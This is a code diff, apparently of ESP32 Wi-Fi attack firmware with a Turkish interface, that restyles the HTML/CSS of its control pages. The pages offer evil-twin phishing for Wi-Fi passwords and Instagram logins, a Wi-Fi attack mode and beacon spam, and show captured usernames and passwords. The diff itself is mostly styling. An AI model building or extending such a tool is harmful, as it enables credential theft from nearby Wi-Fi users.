@@ -146,7 +146,7 @@ void nextChannel() {
 
     if (ch != wifi_channel && ch >= 1 && ch <= 14) {
       wifi_channel = ch;
-      //wifi_set_channel(wifi_channel);
+      
       esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
     }
   }
@@ -171,68 +171,80 @@ void handleRoot() {
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Seçenekler</title>
-  <style>
-    body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #403f3f;
-      color: white;
-    }
-    h1 {
-      margin-bottom: 40px;
-    }
-    button {
-      width: 250px;
-      padding: 15px;
-      margin: 10px;
-      font-size: 18px;
-      border: none;
-      border-radius: 10px;
-      background-color: #007bff;
-      color: rgb(255, 255, 255);
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-    .credentials {
-      margin-top: 30px;
-      padding: 15px;
-      border: 1px solid #555;
-      border-radius: 5px;
-      background-color: #2a2a2a;
-      width: 250px;
-      text-align: left;
-    }
-    .credential-title {
-      font-weight: bold;
-      margin-bottom: 10px;
-      color: #007bff;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern 4 Butonlu Menü</title>
+    <style>
+        /* Genel Stil */
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #2d2d2d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            text-align: center;
+        }
+
+        /* Başlık */
+        h1 {
+            font-size: 36px;
+            margin-bottom: 40px;
+        }
+
+        .menu {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .menu-btn {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #444;
+            border: 2px solid transparent;
+            border-radius: 25px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease-in-out;
+        }
+
+        /* Buton Hover Efekti */
+        .menu-btn:hover {
+            background-color: #007bff;
+            color: #fff;
+            border-color: #007bff;
+            transform: scale(1.05);
+        }
+
+        /* Butonlar Arası Geçiş */
+        .menu-btn:focus {
+            outline: none;
+        }
+    </style>
 </head>
 <body>
-  <h1>Seçenekler</h1>
-  <button onclick="location.href='/evil-twin-password'">Evil Twin (Wifi Şifresi)</button>
-  <button onclick="location.href='/evil-twin-instagram'">Evil Twin (İnstagram)</button>
-  <button onclick="location.href='/wifi-attack'">Wifi Saldırısı</button>
-  <button onclick="location.href='/wifi-spam'">Wifi Spam</button>
+
+    <div class="content">
+        <h1>Seçenekler</h1>
+
+        <div class="menu">
+            <button class="menu-btn" onclick="location.href='/evil-twin-password'">Evil Twin (Wifi Şifresi)</button>
+            <button class="menu-btn" onclick="location.href='/evil-twin-instagram'">Evil Twin (İnstagram)</button>
+            <button class="menu-btn" onclick="location.href='/wifi-attack'">Wifi Saldırısı</button>
+            <button class="menu-btn" onclick="location.href='/wifi-spam'">Wifi Spam</button>
 )=====";
 
   
   if (kullaniciAdi != "" && sifre != "") {
     html += R"=====(
   <div class="credentials">
-    <div class="credential-title">Evil Twin Credentials</div>
+    <div class="credential-title">Evil Twin İnstagram</div>
     <p>Kullanıcı: )=====";
     html += kullaniciAdi;
     html += R"=====(</p>
@@ -247,7 +259,7 @@ void handleRoot() {
   if (targetSSID != "" && savedPassword != "") {
     html += R"=====(
   <div class="credentials">
-    <div class="credential-title">WiFi Credentials</div>
+    <div class="credential-title">WiFi Wifi</div>
     <p>WiFi: )=====";
     html += targetSSID;
     html += R"=====(</p>
@@ -285,49 +297,60 @@ void scanNetworks() {
 
 void handleWifiSpam() {
    
-    String html = R"=====(
-  <!DOCTYPE html>
+String html = R"=====(
+<!DOCTYPE html>
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Wifi Spam</title>
   <style>
-    body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #403f3f;
+     body {
+        font-family: 'Roboto', sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #2d2d2d;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: white;
+        text-align: center;
     }
+
     h1 {
-      margin-bottom: 40px;
-      color: #ffffff;
+        font-size: 36px;
+        margin-bottom: 40px;
     }
+
     .status {
-      margin-bottom: 20px;
-      color: #ffffff;
-      font-size: 24px;
-      font-weight: bold;
+        margin-bottom: 20px;
+        color: #ffffff;
+        font-size: 24px;
+        font-weight: bold;
     }
+
     button {
-      width: 250px;
-      padding: 15px;
-      margin: 10px;
-      font-size: 18px;
-      border: none;
-      border-radius: 10px;
-      background-color: #007bff;
-      color: rgb(255, 255, 255);
-      cursor: pointer;
-      transition: background-color 0.3s;
+        padding: 15px 30px;
+        font-size: 18px;
+        color: #fff;
+        background-color: #444;
+        border: 2px solid transparent;
+        border-radius: 25px;
+        cursor: pointer;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        transition: all 0.3s ease-in-out;
     }
+
     button:hover {
-      background-color: #0056b3;
+        background-color: #007bff;
+        color: #fff;
+        border-color: #007bff;
+        transform: scale(1.05);
     }
+    
   </style>
 </head>
 <body>
@@ -336,18 +359,26 @@ void handleWifiSpam() {
   <button onclick="stopWifiSpam()">Wifi Spam Durdur</button>
 
   <script>
+    var stopClicked = false;  // Butona tıklanıp tıklanmadığını kontrol etmek için bir değişken
+
     function stopWifiSpam() {
-      location.href = '/';
+      stopClicked = true;  // Butona tıklanmış olduğunu belirtiyoruz
+      window.location.replace('/');  // Yönlendirme işlemi
     }
-        setInterval(function() {
+
+    // Sayfa her 500ms'de yenileniyor
+    setInterval(function() {
+      if (!stopClicked) {  // Eğer butona tıklanmadıysa, sayfa yeniden yüklensin
         location.reload();
+      }
     }, 500); 
   </script>
 </body>
 </html>
 )=====";
+
   webServer.send(200, "text/html", html);
-   wifiSpamActive = true;
+  wifiSpamActive = true;
 }
 
 
@@ -358,9 +389,7 @@ void handleWifiSpam() {
 void handleInstagram() {
   wifiSpamActive = false; 
   scanNetworks();
-  
-  
-  String html = R"=====(
+String html = R"=====(
 <!DOCTYPE html>
 <html lang='tr'>
 <head>
@@ -378,22 +407,29 @@ void handleInstagram() {
       align-items: center;
       color: white;
       font-size: 14px;
+      height: 100vh;
+      overflow: hidden;
     }
+
     h2 {
       margin: 15px 0;
       font-size: 18px;
       color: white;
     }
+
     table {
       border-collapse: collapse;
       width: 100%;
-      max-width: 500px;
+      max-width: 600px;  /* Maksimum genişlik */
       background: #505050;
       box-shadow: 0 1px 4px rgba(0,0,0,0.15);
       border-radius: 8px;
       overflow: hidden;
       margin-bottom: 15px;
+      table-layout: auto;
+      word-wrap: break-word; /* Kelimeleri taşmaması için kırma */
     }
+
     th, td {
       text-align: left;
       padding: 8px 12px;
@@ -401,15 +437,18 @@ void handleInstagram() {
       border-bottom: 1px solid #666;
       color: white;
     }
+
     th {
       background-color: #007bff;
       color: white;
       padding: 8px 12px;
       font-size: 12px;
     }
+
     tr:hover {
       background-color: #606060;
     }
+
     button {
       background-color: #007bff;
       color: white;
@@ -420,9 +459,11 @@ void handleInstagram() {
       cursor: pointer;
       transition: background-color 0.2s ease;
     }
+
     button:hover {
       background-color: #0056b3;
     }
+
     a.home-link {
       margin-top: 15px;
       text-decoration: none;
@@ -430,8 +471,34 @@ void handleInstagram() {
       font-weight: bold;
       font-size: 12px;
     }
+
     a.home-link:hover {
       text-decoration: underline;
+    }
+
+    /* Responsive dizayn */
+    @media screen and (max-width: 600px) {
+      body {
+        padding: 5px;
+      }
+
+      table {
+        width: 100%;
+        font-size: 10px;  /* Küçük ekranlarda daha küçük font */
+      }
+
+      th, td {
+        padding: 6px;
+      }
+
+      button {
+        font-size: 10px; /* Buton font büyüklüğünü küçült */
+        padding: 3px 6px;
+      }
+
+      a.home-link {
+        font-size: 10px;
+      }
     }
   </style>
 </head>
@@ -1078,7 +1145,7 @@ void handleUpdateWifi() {
 void handleEvilTwin() {
   scanNetworks(); 
   
-  String html = R"=====(
+String html = R"=====(
 <!DOCTYPE html>
 <html lang='tr'>
 <head>
@@ -1096,22 +1163,29 @@ void handleEvilTwin() {
       align-items: center;
       color: white;
       font-size: 14px;
+      height: 100vh;
+      overflow: hidden;
     }
+
     h2 {
       margin: 15px 0;
       font-size: 18px;
       color: white;
     }
+
     table {
       border-collapse: collapse;
       width: 100%;
-      max-width: 500px;
+      max-width: 600px;  /* Maksimum genişlik */
       background: #505050;
       box-shadow: 0 1px 4px rgba(0,0,0,0.15);
       border-radius: 8px;
       overflow: hidden;
       margin-bottom: 15px;
+      table-layout: auto;
+      word-wrap: break-word; /* Kelimeleri taşmaması için kırma */
     }
+
     th, td {
       text-align: left;
       padding: 8px 12px;
@@ -1119,15 +1193,18 @@ void handleEvilTwin() {
       border-bottom: 1px solid #666;
       color: white;
     }
+
     th {
       background-color: #007bff;
       color: white;
       padding: 8px 12px;
       font-size: 12px;
     }
+
     tr:hover {
       background-color: #606060;
     }
+
     button {
       background-color: #007bff;
       color: white;
@@ -1138,9 +1215,11 @@ void handleEvilTwin() {
       cursor: pointer;
       transition: background-color 0.2s ease;
     }
+
     button:hover {
       background-color: #0056b3;
     }
+
     a.home-link {
       margin-top: 15px;
       text-decoration: none;
@@ -1148,8 +1227,34 @@ void handleEvilTwin() {
       font-weight: bold;
       font-size: 12px;
     }
+
     a.home-link:hover {
       text-decoration: underline;
+    }
+
+    /* Responsive dizayn */
+    @media screen and (max-width: 600px) {
+      body {
+        padding: 5px;
+      }
+
+      table {
+        width: 100%;
+        font-size: 10px;  /* Küçük ekranlarda daha küçük font */
+      }
+
+      th, td {
+        padding: 6px;
+      }
+
+      button {
+        font-size: 10px; /* Buton font büyüklüğünü küçült */
+        padding: 3px 6px;
+      }
+
+      a.home-link {
+        font-size: 10px;
+      }
     }
   </style>
 </head>
@@ -1174,7 +1279,7 @@ void handleEvilTwin() {
     html += "<td>" + networks[i].ssid + "</td>";
     html += "<td>" + networks[i].bssid + "</td>";
     html += "<td>" + String(networks[i].channel) + "</td>";
-    html += "<td><button onclick=\"location.href='/select-network?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
+    html += "<td><button onclick=\"location.href='/select-instagram?ssid=" + networks[i].ssid + "&bssid=" + networks[i].bssid + "'\">Seç</button></td>";
     html += "</tr>";
   }
 
@@ -1185,6 +1290,7 @@ void handleEvilTwin() {
 </body>
 </html>
 )=====";
+
 
   webServer.send(200, "text/html", html);
 }
